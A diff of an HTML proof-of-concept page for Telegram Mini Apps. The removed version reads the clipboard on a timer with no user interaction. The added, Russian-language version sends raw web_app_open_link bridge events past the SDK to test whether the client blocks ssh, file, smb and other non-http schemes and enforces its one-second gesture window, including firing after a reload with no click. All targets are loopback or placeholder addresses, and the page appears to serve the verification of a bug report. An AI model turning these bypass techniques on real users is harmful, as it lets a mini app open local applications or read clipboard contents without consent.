@@ -1,35 +1,224 @@
 <!doctype html>
+<html lang="ru">
+<head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Web K clipboard interaction-TTL PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Проверка open_link</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-  body { font: 16px system-ui; margin: 2rem; }
-  button { font: inherit; padding: .7rem 1rem; }
-  pre { white-space: pre-wrap; overflow-wrap: anywhere; }
+  body { margin: 0; padding: 16px; font: 15px/1.5 -apple-system, system-ui, sans-serif;
+         background: var(--tg-theme-bg-color, #fff); color: var(--tg-theme-text-color, #000); }
+  h1 { font-size: 17px; margin: 0 0 4px; }
+  .sub { color: var(--tg-theme-hint-color, #777); font-size: 13px; margin-bottom: 14px; }
+  .row { display: grid; grid-template-columns: 1fr auto; gap: 6px 12px; align-items: baseline;
+         border: 1px solid var(--tg-theme-hint-color, #ccc); border-radius: 10px; padding: 12px; margin-bottom: 12px; }
+  .row div:nth-child(even) { font-weight: 600; text-align: right; word-break: break-all; }
+  button { width: 100%; padding: 12px; margin: 6px 0; font-size: 15px; border-radius: 10px;
+           border: 0; background: var(--tg-theme-button-color, #2f81f7); color: var(--tg-theme-button-text-color, #fff); }
+  button.secondary { background: transparent; color: var(--tg-theme-button-color, #2f81f7);
+                     border: 1px solid var(--tg-theme-button-color, #2f81f7); }
+  select, input { width: 100%; padding: 10px; font: 14px/1.4 ui-monospace, Menlo, monospace;
+                  border-radius: 8px; border: 1px solid var(--tg-theme-hint-color, #ccc);
+                  background: var(--tg-theme-secondary-bg-color, #f7f7f7); color: inherit; box-sizing: border-box; }
+  label { display: block; font-size: 13px; color: var(--tg-theme-hint-color, #777); margin: 10px 0 4px; }
+  .target { font: 12px/1.45 ui-monospace, Menlo, monospace; word-break: break-all;
+            background: var(--tg-theme-secondary-bg-color, #f3f3f3); border-radius: 8px;
+            padding: 8px; margin: 2px 0 10px; }
+  #countdown { font-size: 22px; font-weight: 700; text-align: center; margin: 4px 0 10px; }
+  #log { white-space: pre-wrap; word-break: break-word; font: 12px/1.45 ui-monospace, Menlo, monospace;
+         background: var(--tg-theme-secondary-bg-color, #f3f3f3); border-radius: 10px; padding: 10px; margin-top: 12px; }
 </style>
-<h1>Clipboard interaction-TTL PoC</h1>
-<p id="status">Automatic read scheduled for 12 seconds after page load.</p>
-<button id="grant" type="button">Grant clipboard permission with this interaction</button>
-<pre id="result">No callback yet.</pre>
+</head>
+<body>
+<h1>Проверка open_link</h1>
+<div class="sub">По документации <code>web_app_open_link</code> открывает только схемы из
+<code>web_app_allowed_protocols</code> (сейчас это <code>http</code> и <code>https</code>)
+и только в ответ на нажатие внутри мини-приложения, не позже секунды после него.
+Проверяем оба условия по отдельности.</div>
+
+<div class="row">
+  <div>Платформа</div><div id="platform">—</div>
+  <div>Версия моста</div><div id="version">—</div>
+  <div>Доступный мост</div><div id="bridge">—</div>
+  <div>Разрешённые схемы</div><div id="allowed">—</div>
+</div>
+
+<label for="scheme">Что открываем</label>
+<select id="scheme"></select>
+<div class="target" id="t-scheme"></div>
+
+<button id="btn-now">1. Схема: выстрелить сразу по нажатию</button>
+<div class="target">Жест свежий, спорная только схема. Если обработчик запустился —
+список схем не проверяется.</div>
+
+<label for="delay">Задержка для проверки окна в секунду, с</label>
+<input id="delay" type="number" min="0" max="60" step="1" value="3">
+<button id="btn-delay">2. Окно: нажать сейчас, выстрелить через N секунд</button>
+<div id="countdown">—</div>
+<div class="target">После нажатия ничего не трогай. Прогони 1, 2, 3, 5, 10 —
+так видно настоящую границу, а не одно значение из репорта.</div>
+
+<button id="btn-reload" class="secondary">3. Без единого нажатия: перезагрузить и выстрелить</button>
+<div class="target">Страница перезагрузится и выстрелит сама. В новом документе
+нажатий не было вообще — проверяем, обнуляется ли счётчик при переходе.</div>
+
+<button id="btn-sdk" class="secondary">4. Для сравнения: то же через openLink()</button>
+<div class="target">Штатный метод SDK. Нужен, чтобы отделить проверку в библиотеке
+от проверки в клиенте.</div>
+
+<button id="btn-copy" class="secondary">Скопировать журнал</button>
+<div id="log"></div>
+
 <script>
-  const status = document.querySelector('#status');
-  const result = document.querySelector('#result');
+(function () {
+  var tg = window.Telegram && window.Telegram.WebApp;
+  var log = document.getElementById('log');
+  var lines = [];
 
-  function requestClipboard(label) {
-    Telegram.WebApp.readTextFromClipboard((text) => {
-      result.textContent = `${label}: ${text === null || text === undefined ? '[no data]' : text}`;
-    });
+  function say(text) {
+    lines.push(new Date().toISOString().slice(11, 23) + '  ' + text);
+    log.textContent = lines.join('\n');
   }
+  function set(id, value) { document.getElementById(id).textContent = value; }
 
-  document.querySelector('#grant').addEventListener('click', () => {
-    requestClipboard('interactive request');
+  // Все цели — петля или заведомо несуществующий адрес: наружу не уходит
+  // ничего, а доказывает запуск обработчика сам факт открытия приложения.
+  var TARGETS = [
+    ['ssh://tso-poc@127.0.0.1:2222/',        'ssh — случай из репорта, открывает Терминал'],
+    ['ftp://127.0.0.1:2121/',                'ftp'],
+    ['vnc://127.0.0.1:5900',                 'vnc — «Общий экран»'],
+    ['smb://127.0.0.1/tso-poc',              'smb — Finder'],
+    ['telnet://127.0.0.1:2323',              'telnet'],
+    ['mailto:tso-poc@example.invalid',       'mailto — почтовый клиент'],
+    ['tel:+10000000000',                     'tel — FaceTime'],
+    ['itms-apps://apps.apple.com/app/id1',   'itms-apps — App Store'],
+    ['file:///Applications/',                'file — Finder, папка приложений'],
+    ['https://example.com/tso-poc',          'https — контроль, схема разрешена']
+  ];
+
+  var select = document.getElementById('scheme');
+  TARGETS.forEach(function (pair, i) {
+    var option = document.createElement('option');
+    option.value = String(i);
+    option.textContent = pair[1];
+    select.appendChild(option);
   });
 
-  setTimeout(() => {
-    status.textContent = 'Automatic interaction-free request sent after 12 seconds.';
-    requestClipboard('automatic request');
-  }, 12000);
+  function target() { return TARGETS[Number(select.value)][0]; }
+  function showTarget() { document.getElementById('t-scheme').textContent = target(); }
+  select.onchange = showTarget;
 
-  Telegram.WebApp.ready();
+  function bridgeName() {
+    if (window.TelegramWebviewProxy && window.TelegramWebviewProxy.postEvent) return 'TelegramWebviewProxy';
+    if (window.external && typeof window.external.notify === 'function') return 'external.notify';
+    if (window.parent !== window) return 'parent.postMessage';
+    return 'не найден';
+  }
+
+  // Шлём сырое событие мимо SDK: его openLink() проверяет схему на стороне
+  // страницы, а проверять надо клиент. Недобросовестный мини-апп библиотеку
+  // звать не станет.
+  function postRaw(eventType, eventData) {
+    var payload = JSON.stringify(eventData);
+    try {
+      if (window.TelegramWebviewProxy && window.TelegramWebviewProxy.postEvent) {
+        window.TelegramWebviewProxy.postEvent(eventType, payload);
+        return 'TelegramWebviewProxy';
+      }
+      if (window.external && typeof window.external.notify === 'function') {
+        window.external.notify(JSON.stringify({ eventType: eventType, eventData: eventData }));
+        return 'external.notify';
+      }
+      if (window.parent !== window) {
+        window.parent.postMessage(JSON.stringify({ eventType: eventType, eventData: eventData }), '*');
+        return 'parent.postMessage';
+      }
+    } catch (error) {
+      say('мост отказал: ' + error);
+      return null;
+    }
+    say('мост не найден — страница открыта не как мини-приложение');
+    return null;
+  }
+
+  function fire(url, note) {
+    say('--- шлю web_app_open_link, url = ' + url + (note ? '  (' + note + ')' : ''));
+    var used = postRaw('web_app_open_link', { url: url, try_instant_view: false });
+    if (used) say('ушло через ' + used + '. Смотри, открылось ли что-нибудь.');
+  }
+
+  set('platform', (tg && tg.platform) || 'неизвестна');
+  set('version', (tg && tg.version) || '—');
+  set('bridge', bridgeName());
+  set('allowed', 'http, https');
+  showTarget();
+
+  say('платформа: ' + ((tg && tg.platform) || '?') + ', версия моста: ' + ((tg && tg.version) || '?'));
+  say('мост: ' + bridgeName());
+
+  document.getElementById('btn-now').onclick = function () {
+    fire(target(), 'жест свежий');
+  };
+
+  document.getElementById('btn-delay').onclick = function () {
+    var seconds = Math.max(0, Number(document.getElementById('delay').value) || 0);
+    var url = target();
+    var started = Date.now();
+    say('--- взвожу: выстрел через ' + seconds + ' с, дальше не трогай ничего');
+    var left = seconds;
+    document.getElementById('countdown').textContent = left || 'выстрел';
+    var timer = setInterval(function () {
+      left -= 1;
+      if (left > 0) {
+        document.getElementById('countdown').textContent = left;
+        return;
+      }
+      clearInterval(timer);
+      document.getElementById('countdown').textContent = 'выстрел';
+      var waited = Math.round((Date.now() - started) / 100) / 10;
+      fire(url, 'после нажатия прошло ' + waited + ' с');
+    }, 1000);
+  };
+
+  document.getElementById('btn-reload').onclick = function () {
+    try { sessionStorage.setItem('tso-autofire', String(Number(select.value))); } catch (e) {}
+    say('перезагружаюсь, после загрузки выстрелю без нажатий');
+    setTimeout(function () { location.reload(); }, 400);
+  };
+
+  document.getElementById('btn-sdk').onclick = function () {
+    var url = target();
+    say('--- штатный SDK: openLink(' + url + ')');
+    try {
+      tg.openLink(url);
+      say('SDK не отказал — значит схему он не проверяет, вопрос только к клиенту');
+    } catch (error) {
+      say('SDK отказал: ' + error.message);
+    }
+  };
+
+  document.getElementById('btn-copy').onclick = function () {
+    var text = lines.join('\n');
+    if (navigator.clipboard) navigator.clipboard.writeText(text).then(
+      function () { say('журнал скопирован'); },
+      function () { say('скопировать не вышло, выдели руками'); });
+  };
+
+  // Выстрел без единого нажатия в этом документе: флаг пережил перезагрузку.
+  try {
+    var pending = sessionStorage.getItem('tso-autofire');
+    if (pending !== null) {
+      sessionStorage.removeItem('tso-autofire');
+      select.value = pending;
+      showTarget();
+      say('страница загрузилась заново, нажатий в ней не было');
+      setTimeout(function () { fire(target(), 'нажатий в документе не было ни одного'); }, 1200);
+    }
+  } catch (e) {}
+
+  if (tg && tg.ready) tg.ready();
+  if (tg && tg.expand) tg.expand();
+})();
 </script>
+</body>
+</html>
